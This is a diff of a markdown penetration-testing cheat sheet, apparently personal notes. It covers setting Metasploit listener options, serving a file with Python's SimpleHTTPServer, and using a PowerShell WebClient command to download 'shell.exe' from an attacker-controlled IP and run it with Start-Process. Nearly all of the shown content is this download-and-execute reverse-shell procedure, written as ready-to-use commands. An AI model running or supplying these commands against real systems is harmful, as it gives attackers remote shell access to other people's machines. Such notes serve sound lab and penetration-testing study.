@@ -11,11 +11,13 @@
   -  set lport (match what is in payload)
   -  set lhost
   -  run
+  -  host webserver where file located
+    - `python -m SimpleHTTPServer 80`   
 
 - **Powershell**
   - from current powershell
-  - `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.16.33:80/shell-name.exe', 'shell-name.exe')"`
+  - `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.0.0.10:80/shell-name.exe', 'shell-name.exe')"`
     - Example:
-      - `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.16.33:80/shell.exe', 'shell.exe')"`
+      - `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.0.0.10:80/shell.exe', 'shell.exe')"`
   - dir to make sure in there
   - `Start-Process "shell-name.exe"`
